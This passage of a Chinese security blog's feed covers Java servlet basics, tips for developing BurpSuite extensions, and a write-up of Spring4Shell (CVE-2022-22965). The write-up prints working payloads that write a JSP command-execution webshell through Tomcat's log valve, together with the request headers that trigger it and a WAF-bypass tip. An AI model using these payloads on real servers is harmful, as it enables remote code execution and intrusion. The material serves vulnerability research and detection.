&lt;h4 id=&quot;Listener&quot;&gt;&lt;a href=&quot;#Listener&quot; class=&quot;headerlink&quot; title=&quot;Listener&quot;&gt;&lt;/a&gt;Listener&lt;/h4&gt;&lt;p&gt;Listener也称之为监听器，可以监听Application、Session和Request对象的创建、销毁事件，以及监听对其中添加、修改、删除属性事件，并自动执行自定义的功能。&lt;/p&gt;
&lt;h4 id=&quot;Filter&quot;&gt;&lt;a href=&quot;#Filter&quot; class=&quot;headerlink&quot; title=&quot;Filter&quot;&gt;&lt;/a&gt;Filter&lt;/h4&gt;&lt;p&gt;Filter也称之为过滤器，可以动态地修改HttpServletRequest，HttpServletResponse中的头和数据。&lt;/p&gt;
&lt;h4 id=&quot;Servlet-1&quot;&gt;&lt;a href=&quot;#Servlet-1&quot; class=&quot;headerlink&quot; title=&quot;Servlet&quot;&gt;&lt;/a&gt;Servlet&lt;/h4&gt;&lt;p&gt;Servlet是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。Servlet 可以理解为某一个路径后续的业务处理逻辑。&lt;/p&gt;
&lt;p&gt;Tomcat是http服务器+servlet容器，当Tomcat作为Servlet容器的时候，讲http请求文本解析之后封装成&lt;code&gt;HttpServletRequest&lt;/code&gt;类型的request对象，传递给Servlet，同时讲相应的信息封装为&lt;code&gt;HttpServletResponse&lt;/code&gt;类型的response对象，将response对象交给tomcat，tomcat格式化之后返回给浏览器&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>BurpSuite插件开发注意事项</title>
    <link href="https://jkme.github.io/2022/04/11/burpsuite-ext-dev.html"/>
    <id>https://jkme.github.io/2022/04/11/burpsuite-ext-dev.html</id>
    <published>2022-04-10T16:00:00.000Z</published>
    <updated>2022-04-12T10:22:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-Base64的坑"><a href="#0x1-Base64的坑" class="headerlink" title="0x1. Base64的坑"></a>0x1. Base64的坑</h2><p>在JDK8版本里面，Java自带的<code>java.util.Base64</code>是根据RFC4648和RFC2045实现的，但是JDK7里面的<code>sun.misc.BASE64Encoder</code>，是RFC1521实现的。<br>这会导致<code>java.util.Base64</code>解码JDK7版本的Base64发生错误：<code>Illegal base64 character</code>。</p><p>可以使用shiro的Base64解决，增加maven依赖:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">></span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">></span></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">></span></span>shiro<span class="token operator">-</span>core<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">></span></span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PS: chybeta师傅在漏洞百出里面提出过，Shiro在Base64解码的时候会丢弃非Base64字符串，所以可以利用这一点绕过WAF防火墙，比如填充垃圾字符串。</p><h2 id="0x2-RSA公私钥"><a href="#0x2-RSA公私钥" class="headerlink" title="0x2. RSA公私钥"></a>0x2. RSA公私钥</h2><p>Python加解密的时候，使用的是PKCS#1格式的公私钥：</p><pre class="line-numbers language-none"><code class="language-none"># 公钥-----BEGIN RSA PUBLIC KEY----------END RSA PUBLIC KEY-----  # 私钥-----BEGIN RSA PRIVATE KEY----------END RSA PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是在Java里面需要使用PKCS#8格式:</p><pre class="line-numbers language-none"><code class="language-none"># 公钥-----BEGIN PUBLIC KEY----------END PUBLIC KEY-----  # 私钥-----BEGIN PRIVATE KEY----------END PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PKCS#1私钥转换为PKCS#8格式: <code>openssl pkcs8 -topk8 -inform PEM -in rsa_private.pem -outform pem -nocrypt -out pkcs8.pem</code></p><p>RSA根据PKCS#8私钥生成公钥:  <code>openssl rsa -in pkcs8.pem -out rsa_public.pem -pubout</code></p><h2 id="0x3-插件打包"><a href="#0x3-插件打包" class="headerlink" title="0x3. 插件打包"></a>0x3. 插件打包</h2><p>在插件开发完成之后，如果依赖有第三方的Jar包，需要把第三方的依赖也打包进去，修改pom.xml文件的build模块，加入maven的插件配置:</p><pre class="line-numbers language-none"><code class="language-none">&lt;build&gt;       &lt;plugins&gt;           &lt;plugin&gt;               &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt;               &lt;artifactId&gt;maven-compiler-plugin&lt;&#x2F;artifactId&gt;               &lt;configuration&gt;                   &lt;source&gt;8&lt;&#x2F;source&gt;                   &lt;target&gt;8&lt;&#x2F;target&gt;               &lt;&#x2F;configuration&gt;           &lt;&#x2F;plugin&gt;           &lt;plugin&gt;               &lt;artifactId&gt;maven-assembly-plugin&lt;&#x2F;artifactId&gt;               &lt;configuration&gt;                   &lt;archive&gt;                       &lt;manifest&gt;                           &lt;mainClass&gt;burp.BurpExtender&lt;&#x2F;mainClass&gt;                       &lt;&#x2F;manifest&gt;                   &lt;&#x2F;archive&gt;                   &lt;descriptorRefs&gt;                       &lt;descriptorRef&gt;jar-with-dependencies&lt;&#x2F;descriptorRef&gt;                   &lt;&#x2F;descriptorRefs&gt;               &lt;&#x2F;configuration&gt;           &lt;&#x2F;plugin&gt;       &lt;&#x2F;plugins&gt;   &lt;&#x2F;build&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后打包插件:</p><pre class="line-numbers language-none"><code class="language-none">mvn clean mvn clean compile assembly:single  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="0x4-插件调试"><a href="#0x4-插件调试" class="headerlink" title="0x4. 插件调试"></a>0x4. 插件调试</h2><p>在开发插件的时候，如果需要对插件实时调试，可以选择先在官网下载安装社区版本的BurpSuite，然后启动Burpsuite:</p><pre class="line-numbers language-none"><code class="language-none">java -agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005 -jar burpsuite_community.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后新增远程调试:<br><img src="/2022/04/11/burpsuite-ext-dev/1.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x1-Base64的坑&quot;&gt;&lt;a href=&quot;#0x1-Base64的坑&quot; class=&quot;headerlink&quot; title=&quot;0x1. Base64的坑&quot;&gt;&lt;/a&gt;0x1. Base64的坑&lt;/h2&gt;&lt;p&gt;在JDK8版本里面，Java自带的&lt;code&gt;java.util.Base64&lt;/code&gt;是根据RFC4648和RFC2045实现的，但是JDK7里面的&lt;code&gt;sun.misc.BASE64Encoder&lt;/code&gt;，是RFC1521实现的。&lt;br&gt;这会导致&lt;code&gt;java.util.Base64&lt;/code&gt;解码JDK7版本的Base64发生错误：&lt;code&gt;Illegal base64 character&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;可以使用shiro的Base64解决，增加maven依赖:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;dependency&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;groupId&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;org&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;apache&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;shiro&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;groupId&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
    &lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;artifactId&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;shiro&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;core&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;artifactId&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
    &lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;version&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1.6&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;version&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;dependency&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;PS: chybeta师傅在漏洞百出里面提出过，Shiro在Base64解码的时候会丢弃非Base64字符串，所以可以利用这一点绕过WAF防火墙，比如填充垃圾字符串。&lt;/p&gt;
&lt;h2 id=&quot;0x2-RSA公私钥&quot;&gt;&lt;a href=&quot;#0x2-RSA公私钥&quot; class=&quot;headerlink&quot; title=&quot;0x2. RSA公私钥&quot;&gt;&lt;/a&gt;0x2. RSA公私钥&lt;/h2&gt;&lt;p&gt;Python加解密的时候，使用的是PKCS#1格式的公私钥：&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# 公钥
-----BEGIN RSA PUBLIC KEY-----
-----END RSA PUBLIC KEY-----
  
# 私钥
-----BEGIN RSA PRIVATE KEY-----
-----END RSA PRIVATE KEY-----&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;但是在Java里面需要使用PKCS#8格式:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# 公钥
-----BEGIN PUBLIC KEY-----
-----END PUBLIC KEY-----
  
# 私钥
-----BEGIN PRIVATE KEY-----
-----END PRIVATE KEY-----&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2022-22965漏洞记录</title>
    <link href="https://jkme.github.io/2022/04/06/CVE-2022-22965.html"/>
    <id>https://jkme.github.io/2022/04/06/CVE-2022-22965.html</id>
    <published>2022-04-05T16:00:00.000Z</published>
    <updated>2022-04-12T09:51:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞时间线"><a href="#漏洞时间线" class="headerlink" title="漏洞时间线"></a>漏洞时间线</h2><ul><li><p>CVE-2010-1622 Spring第一次<a href="https://www.inbreak.net/archives/377">爆发漏洞</a>，同时也影响了Struts(<a href="https://su18.org/post/struts2-2/#s2-020s2-021s2-022">S2-020/S2-021/S2-022</a>)</p></li><li><p>2017年9月10日 Oracle官方发文解释Java 9的module新特性</p></li><li><p>2022年3月29日 蚂蚁集团报告漏洞（CVE-2022-22965）</p></li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ul><li><p>CVE-2010-1622/Struts(<a href="https://su18.org/post/struts2-2/#s2-020s2-021s2-022">S2-020/S2-021/S2-022</a>)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>directory<span class="token operator">=</span>webapps<span class="token operator">/</span>ROOT<span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>prefix<span class="token operator">=</span>shell<span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>suffix<span class="token operator">=</span><span class="token punctuation">.</span>jsp<span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>fileDateFormat<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>pattern<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc2<span class="token operator">%</span><span class="token number">7D</span>i<span class="token operator">%</span><span class="token function">20if</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>j<span class="token operator">%</span><span class="token number">22.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>pwd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">%</span><span class="token number">20</span>in<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc1<span class="token operator">%</span><span class="token number">7D</span>i<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>cmd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>int<span class="token operator">%</span><span class="token number">20</span>a<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">20</span>b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span>new<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B2048<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token function">20while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">%</span><span class="token number">3D</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">3D</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token function">20String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bsuffix<span class="token operator">%</span><span class="token number">7D</span>i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>CVE-2022-22965在Java9新增了module之后:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>directory<span class="token operator">=</span>webapps<span class="token operator">/</span>ROOT<span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>prefix<span class="token operator">=</span>shell<span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>suffix<span class="token operator">=</span><span class="token punctuation">.</span>jsp<span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>fileDateFormat<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>pattern<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc2<span class="token operator">%</span><span class="token number">7D</span>i<span class="token operator">%</span><span class="token function">20if</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>j<span class="token operator">%</span><span class="token number">22.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>pwd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">%</span><span class="token number">20</span>in<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc1<span class="token operator">%</span><span class="token number">7D</span>i<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>cmd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>int<span class="token operator">%</span><span class="token number">20</span>a<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">20</span>b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span>new<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B2048<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token function">20while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">%</span><span class="token number">3D</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">3D</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token function">20String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bsuffix<span class="token operator">%</span><span class="token number">7D</span>i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后访问webshell的时候，除了提供cmd的参数之外，还需要设置header头：</p><pre class="line-numbers language-none"><code class="language-none">headers &#x3D; &#123;&quot;suffix&quot;:&quot;%&gt;&#x2F;&#x2F;&quot;,            &quot;c1&quot;:&quot;Runtime&quot;,            &quot;c2&quot;:&quot;&lt;%&quot;,            &quot;DNT&quot;:&quot;1&quot;,            &quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>Java版本&gt;=JDK9 </li><li>Spirng运行在Tomcat环境下，以War包部署(Jar包的时候不存在)</li><li>方法入参是非基础类，不能是String，int等</li><li>接口使用了POJO参数绑定</li></ul><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>如果要多次写文件，需要修改fileDateFormat属性，最终会拼接到文件后缀里面</li><li>利用日志写入shell的时候，生成的文件会不断写入，可以关闭日志记录: <code>class.module.classLoader.resources.context.parent.pipeline.first.enabled=false</code></li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>当Content-Type是<code>application/x-www-form-urlencoded</code>的时候，会使用<code>ServletModelAttributeMethodProcessor</code>解析请求，然后进入参数绑定:<code>org.springframework.web.bind.ServletRequestDataBinder#bind(ServletRequest request)</code>:<br><img src="/2022/04/06/CVE-2022-22965/3.png"><br>此时的mpv保存了请求里面的key-value参数，接着进入<code>org.springframework.validation.DataBinder#doBind(MutablePropertyValues mpvs)</code>对获取到的<code>mpvs</code>进行初步校验：<br><img src="/2022/04/06/CVE-2022-22965/4.png"></p><p>将mpvs绑定到bean对象上<code>setPropertyValues</code>:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>AbstractPropertyAccessor</span>#<span class="token function">setPropertyValues</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>PropertyValues</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/06/CVE-2022-22965/5.png"></p><p>然后进入到<code>setPropertyValue</code></p><pre class="line-numbers language-none"><code class="language-none">org.springframework.beans.AbstractNestablePropertyAccessor#setPropertyValue(org.springframework.beans.PropertyValue)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入到: <code>getPropertyAccessorForPropertyPath</code>:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>AbstractNestablePropertyAccessor</span>#<span class="token function">getPropertyAccessorForPropertyPath</span><span class="token punctuation">(</span><span class="token class-name">String</span> propertyPath<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个时候<code>propertyPath</code>是http请求里面注入的变量: <code>class.module.classLoader.resources.context.parent.appBase</code>，此时对变量进行分割，获取第一个class的偏移量，到最后都会进入到<code>org.springframework.beans.CachedIntrospectionResults#CachedIntrospectionResults</code>里面进行验证，这里是判断当获取到的对象是一个Class而又获取ClassLoader属性，则直接跳过。<br><img src="/2022/04/06/CVE-2022-22965/8.png"></p><p>Struts出现漏洞的时候，有师傅写过<a href="https://cs.github.com/julianvilas/rooted2k15/blob/a00055f906502dd038b908a84907b74b38e26b20/struts-tester/struts-tester.jsp">jsp获取可用的环境变量</a>的脚本，可以获取可用的上下文环境变量。</p><p>代码审计phith0n师傅对漏洞的总结：</p><blockquote><p>在Java里面，所有的Java对象都有一个<code>getClass()</code>方法，获取对象的Class，Class又有<code>getClassLoader()</code>方法获取Class的<code>ClassLoader</code>，而在Tomcat中，一些和Tomcat的全局配置相关的属性都保存在<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>这个Tomcat专属的ClassLoader的一些属性、子孙属性里。<br>那么，我们就可以通过person.getClass().getClassLoader().getXXX()来调用ParallelWebappClassLoader中的一些敏感属性最后通过修改Tomcat的配置来执行危险操作。这个调用链放在用户数据包里就是class.classLoader.XXX</p></blockquote><h2 id="漏洞判断"><a href="#漏洞判断" class="headerlink" title="漏洞判断"></a>漏洞判断</h2><h4 id="根据状态码"><a href="#根据状态码" class="headerlink" title="根据状态码"></a>根据状态码</h4><ul><li>返回500: <code>class.module.class.module.classLoader.xx</code></li><li>返回400: <code>class.module.classLoader.DefaultAssertionStatus=nonsense</code></li><li>返回302: <code>class.module.classLoader.resources.context.mapperDirectoryRedirectEnabled=true</code></li></ul><p>返回302的时候需要同时满足三个条件:</p><ol><li>请求路径不能以<code>/</code>结尾</li><li>context的<code>mapperDirectoryRedirectEnabled</code>属性为true</li><li>访问的地址是存在的一个目录</li></ol><p>当<code>class.module.classLoader.resources.context.mapperDirectoryRedirectEnabled=false</code>的时候，访问一个存在的目录是404：<br><img 